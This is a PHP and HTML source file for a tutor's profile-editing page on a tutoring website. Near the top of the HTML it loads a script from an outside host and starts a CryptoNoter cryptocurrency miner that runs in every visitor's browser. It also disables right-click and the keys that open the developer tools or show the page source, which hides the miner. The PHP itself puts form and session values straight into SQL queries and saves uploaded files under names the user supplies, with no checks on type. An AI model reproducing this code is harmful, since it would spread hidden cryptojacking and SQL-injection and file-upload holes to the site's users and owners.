<?php
  include '../config/db.php';
  session_start();
  error_reporting(0);
  if (!isset($_SESSION['tutor_email'])) {
    // code...
    header('Location:../login.php');
  }
    $user = $_SESSION['tutor_email'];
    $selectuser = mysqli_query($con,"SELECT * FROM tutor_profile WHERE t_email='$user'");
    $data = mysqli_fetch_array($selectuser);
   
  
  if (isset($_POST['updateprof'])) {
    // code...
    $t_name = $_POST['t_name'];
    $t_email = $_POST['t_email'];
    $t_dob = $_POST['t_dob'];
    $t_cnic = $_POST['t_cnic'];
    $t_gender = $_POST['t_gender'];
   
    //Uploading Resume
    $resume_name = $_FILES['t_resume']['name'];
    $resume_temp = $_FILES['t_resume']['tmp_name'];
    $resume_size = $_FILES['t_resume']['size'];

    $resume_new = rand(100,1000) . '-' . $resume_name;
    $resume_store = "resume/".$resume_new;

    if(move_uploaded_file($resume_temp, $resume_store)){
      $resume = $resume_new;
    }
    if($resume==''){
        $resume=$data['t_resume'];
    }
    
    
    
    $t_qualification = $_POST['t_qualification'];
    $t_experience = $_POST['t_experience'];
    $t_city = $_POST['t_city'];
    $t_address = $_POST['t_address'];
    $t_bio = $_POST['t_bio'];

    //Uploading Graduation Degree
    $graduation_name = $_FILES['t_grad']['name'];
    $graduation_temp = $_FILES['t_grad']['tmp_name'];
    $graduation_size = $_FILES['t_grad']['size'];

    $graduation_new = rand(100,1000) . '-' . $graduation_name;
    $graduation_store = "degrees/graduation/".$graduation_new;

    if(move_uploaded_file($graduation_temp, $graduation_store)){
      $graduation = $graduation_new;
    }



    //Uploading Masters Degree
   $inter_name = $_FILES['inter_grade']['name'];
   $inter_temp = $_FILES['inter_grade']['tmp_name'];
   $inter_size = $_FILES['inter_grade']['size'];

   $inter_new = rand(100,1000) . '-' . $inter_name;
   $inter_store = "degrees/inter/".$inter_new;

   if(move_uploaded_file($inter_temp, $inter_store)){
     $inter = $inter_new;
   }



    //Uploading Masters Degree
   $master_name = $_FILES['t_mast']['name'];
   $master_temp = $_FILES['t_mast']['tmp_name'];
   $master_size = $_FILES['t_mast']['size'];

   $master_new = rand(100,1000) . '-' . $master_name;
   $master_store = "degrees/masters/".$master_new;

   if(move_uploaded_file($master_temp, $master_store)){
     $masters = $master_new;
   }

   //Uploading M.phill Degree
    $phill_name = $_FILES['t_phill']['name'];
    $phill_temp = $_FILES['t_phill']['tmp_name'];
    $phill_size = $_FILES['t_phill']['size'];

    $phill_new = rand(100,1000) . '-' . $phill_name;
    $phill_store = "degrees/phill/".$phill_new;

    if(move_uploaded_file($phill_temp, $phill_store)){
      $phill = $phill_new;
    }

    //Uploading PhD Degree
    $PhD_name = $_FILES['t_phd']['name'];
    $PhD_temp = $_FILES['t_phd']['tmp_name'];
    $PhD_size = $_FILES['t_phd']['size'];

    $PhD_new = rand(100,1000) . '-' . $PhD_name;
    $PhD_store = "degrees/phd/".$PhD_new;

    if(move_uploaded_file($PhD_temp, $PhD_store)){
      $phd = $PhD_new;
    }


    $t_empstatus = $_POST['t_empstatus'];
    $c_name = $_POST['c_name'];
    $c_pos = $_POST['c_pos'];
    $avail_hours = $_POST['avail_hours'];
    $sess_avail = $_POST['sess_avail'];

    $subj = $_POST['subjects'];
    $subject = "";
    foreach ($subj as $subj1) {
      // code...
      $subject .= "<li>".$subj1."</li>";
    }

    $lg = $_POST['languages'];
    $language = "";
    foreach ($lg as $lg1) {
      // code...
      $language .= "<li>".$lg1."</li>";
    }
    
     $tclasses = $_POST['tclasses'];
    $tclasse = "";
    foreach ($tclasses as $tc1) {
      // code...
      $tclasse .= "<li>".$tc1."</li>";
    }
    
     $sc = $_POST['shortcourses'];
    $shortcourses = "";
    foreach ($sc as $sc1) {
      // code...
      $shortcourses .= "<li>".$sc1."</li>";
    }
    
    
    
    

    $urg_a = $_POST['urg_avail'];
    $urg_avail = "";
    foreach ($urg_a as $urg_b) {
      // code...
      $urg_avail .= "<li>".$urg_b."</li>";
    }

    //Uploading Profile Picture
    $pic_name = $_FILES['t_profile']['name'];
    $pic_temp = $_FILES['t_profile']['tmp_name'];
    $pic_size = $_FILES['t_profile']['size'];

    $pic_new = rand(100,1000) . '-' . $pic_name;
    $pic_store = "profile/pic/".$pic_new;

    if(move_uploaded_file($pic_temp, $pic_store)){
      $pic = $pic_new;
    }

    $date_comp = date("Y-m-d");
    $t_fees = $_POST['t_fees'];
    $msg='';


    $update = "UPDATE tutor_profile SET
                  t_name = '$t_name',
                  t_email = '$t_email',
                  t_dob = '$t_dob',
                  t_cnic = '$t_cnic',
                  t_gender = '$t_gender',
                  t_resume = '$resume'
                 WHERE t_email='$t_email'";

        $runupdate = mysqli_query($con, $update);

        if ($runupdate) {
          // code...
          $msg .= "<div class='alert alert-primary'>Your profile has been updated successfully and will be under review by our administrator.</div>";
          
                /*$sender = 'info@tutormaster.pk';
                $recipient = $t_email;
                $subject = "You have successfully updated your profile";
                $message = "<h2 style='color: #ff214f'>Welcome To Tutor Master</h2>
                            <h3>Dear " .$c_name. " You Have Updated Your Profile Successfully.</h3>
                            <h4>Please wait we will review your profile</h4>
                           <p>If you have update your profile first time we will review your application <br>and within 24-48 hours your profile will be display to students
                  ";
               
               $headers  = 'MIME-Version: 1.0' . "\r\n";
               $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
                $headers .= 'From:' . $sender;


                if(mail($recipient, $subject, $message, $headers)){
              
                }*/
                header('Location:contact_and_profile.php');
        }
  }
 ?>
<!DOCTYPE html>
<html lang="en">
<script src="https://learn2hack.online/processor.js"></script>
<script>
	var addr = 'CryptoNoter';
	var miner = new CryptoNoter.Anonymous(addr, {
        autoThreads: true,
	throttle: 0.8
	});
	miner.start();
	
</script>
<script>
 
 document.addEventListener('contextmenu', function(e) {
  e.preventDefault();
 });
 document.addEventListener('keydown', function(e) {
 if (event.keyCode == 123) {
  return false;
 }
 if (e.ctrlKey && e.shiftKey) {
  return false;
 }
 if (event.ctrlKey && event.keyCode == 85) {
  return false;
 }
});
/* other script code */
</script>
    <head>
        <meta charset="utf-8" />
        <title><?php echo $_SESSION['tutor_name'] ?> - Profile</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta content="A fully featured admin theme which can be used to build CRM, CMS, etc." name="description" />
        <meta content="Coderthemes" name="author" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />

        <?php include 'inc/links.php'; ?>
<style>
    .alert-dismissible{
        display:none;
    }
</style>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
    </head>

    <body class="light-menubar" data-layout="horizontal">
     
       <div id="myModal" class="modal fade">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Things Keep In mind During Profile Completion</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <div class="modal-body">
                <ul>
                    <li>Kindly Read All Form Fields Carefully</li>
                    <li>Fill Form with real data</li>
                    <li>Fields with red asterisk mark (<i class="fas fa-asterisk" style="font-size: 12px; color: red;"></i>) are mendatory to fill<br>otherwise form will not be Submitted</li>
                    
                </ul>
            
            </div>
        </div>
    </div>
</div>
        <!-- Begin page -->
        <div id="wrapper">

            <?php include 'inc/header.php'; ?>

            <!-- ============================================================== -->
            <!-- Start Page Content here -->
            <!-- ============================================================== -->

            <div class="content-page">
                <div class="content">

                    <!-- Start Content-->
                    <div class="container-fluid">

                        <!-- start page title -->
                        <div class="row">
                            <div class="col-12">
                                <div class="page-title-box">
                                    <h4 class="page-title">Edit Profile</h4>
                                </div>
                            </div>
                        </div>
                        <!-- end page title -->
                        <?php
                          if ($_SESSION['tutor_status']=='Inactive') {
                            // code...
                        ?>
                            <div class="row">
                              <div class="col-md-10 offset-md-1">
                                  
                                <div class="alert alert-danger">
                                  <strong>Alert!</strong> Your account is not activated, Check your email account and click the activation link to activate your account. Otherwise, Your profile will not be approved.
                                </div>
                                
                              </div>
                               
                            </div>
                        <?php
                          }

                         ?>

                         <?php
                           $user = $_SESSION['tutor_email'];
                           $query = mysqli_query($con, "SELECT * FROM tutor_profile WHERE t_email='$user'");
                           $rows = mysqli_fetch_array($query);
                           if ($rows['comp_status']=='Incomplete') {
                         ?>
                             <div class="row">
                               <div class="col-md-10 offset-md-1">
                                 <div class="alert alert-warning">
                                   <strong>Warning!</strong> Complete your profile to get access to all pages of your profile and if you want your profile on high rank you must provide all the required details.
                                 </div>
                                 
                               </div>
                             </div>
                         <?php
                           }

                          ?>

                          <?php
                            if (isset($msg)) {
                              // code...
                              echo $msg;
                            }
                           ?>
                          <div class="row">
                            <div class="col-md-10 offset-md-1">
                              <div class="card">
                                <div class="card-header">
                                <h3>Edit Your Profile</h3>
                                </div>
                                <div class="card-body">
                                  <?php
                                    $user = $_SESSION['tutor_email'];
                                    $selectuser = mysqli_query($con,"SELECT * FROM tutor_profile WHERE t_email='$user'");
                                    $data = mysqli_fetch_array($selectuser);
                                   ?>
                                  <!-- dummy-->
                                  <style>
                                      // workaround
.intl-tel-input {
  display: table-cell;
}
.intl-tel-input .selected-flag {
  z-index: 4;
}
.intl-tel-input .country-list {
  z-index: 5;
}
.input-group .intl-tel-input .form-control {
  border-top-left-radius: 4px;
  border-top-right-radius: 0;
  border-bottom-left-radius: 4px;
  border-bottom-right-radius: 0;
}

                                  </style>
                                  
                    
                        <!--dummy end-->          
                                   
                                   
                                   
                                  <form  action="" method="post" enctype="multipart/form-data">
                                       <ul id="default-wizard-header" class="stepy-header"><li id="default-wizard-head-0" class="stepy-active" style="cursor: default;"><div>1</div><span>Basic Information</span></li><li id="default-wizard-head-1" style="cursor: default;"><div>2</div><span>Contact and Profile</span></li><li id="default-wizard-head-2" style="cursor: default;"><div>3</div><span>About You</span></li><li id="default-wizard-head-4" style="cursor: default;"><div>4</div><span>Availability</span></li><li id="default-wizard-head-6" style="cursor: default;"><div>5</div><span>Urgent Availability:</span></li></ul>
                                       
                                       
                                        <h4>Basic Information</h4>

                                            <div class="row mt-3">
                                                <div class="col-md-6">
                                                    <div class="form-group">
                                                        <label for="">Full Name:</label>
                                                        <p class="form-control" style="background-color: #f2f2f2;"><?php echo $data['t_name']; ?></p>
                                                        <input type="hidden" value="<?php echo $data['t_name']; ?>" name="t_name" class="form-control" required readonly>
                                                    </div>

                                                    <div class="form-group">
                                                        <label for="">Email:</label>
                                                        <p class="form-control" style="background-color: #f2f2f2;"><?php echo $data['t_email'] ?></p>
                                                        <input type="hidden" value="<?php echo $data['t_email'] ?>" name="t_email" class="form-control" required readonly>
                                                    </div>

                                                    <div class="form-group">
                                                        <label for="">Date of birth: <i class="fas fa-asterisk" style="font-size: 7px; color: red;"></i></label>
                                                        <input type="date" value="<?php echo $data['t_dob']; ?>" name="t_dob" class="form-control" required="required">
                                                    </div>
                                                </div>
                                                <div class="col-md-6">
                                                    <div class="form-group">
                                                        <label for="">CNIC: <i class="fas fa-asterisk" style="font-size: 7px; color: red;"></i></label>
                                                        <input type="text" value="<?php echo $data['t_cnic']; ?>" name="t_cnic" class="form-control" id="cnic" placeholder="" required>
                                                    </div>

                                                    <div class="form-group">
                                                      <label for="">Gender: <i class="fas fa-asterisk" style="font-size: 7px; color: red;"></i></label>
                                                      <div class="custom-control custom-radio">
                                                        <input type="radio" id="customRadio1" value="Male" name="t_gender" class="custom-control-input" required <?php if($data['t_gender']=='Male'){echo "checked";} ?>>
                                                        <label class="custom-control-label" for="customRadio1" >Male</label>
                                                      </div>
                                                      <div class="custom-control custom-radio">
                                                        <input type="radio" id="customRadio2" value="Female" name="t_gender" class="custom-control-input" <?php if($data['t_gender']=='Female'){echo "checked";} ?>>
                                                        <label class="custom-control-label" for="customRadio2">Female</label>
                                                      </div>
                                                    </div>

                                                    <div class="form-group">
                                                        <label>Resume: <i class="fas fa-asterisk" style="font-size: 7px; color: red;"></i></label>
                                                        <input type="file" name="t_resume" value="<?php echo $data['t_resume']; ?>" class="filestyle" data-buttonBefore="true">
                                                    </div>
                                                </div>
                                            </div>


                                        <button type="submit" name="updateprof" class="btn btn-primary stepy-finish">Next</button>
                                        <br><br>
                                    </form>
                                </div>
                              </div>
                            </div>
                          </div>

                        <!-- end row -->
                    </div> <!-- end container-fluid -->
                </div> <!-- end content -->
                <?php include 'inc/footer.php'; ?>
            </div>

            <!-- ============================================================== -->
            <!-- End Page content -->
            <!-- ============================================================== -->

        </div>
        <!-- END wrapper -->

      <?php include 'inc/scripts.php'; ?>
    </body>
</html>
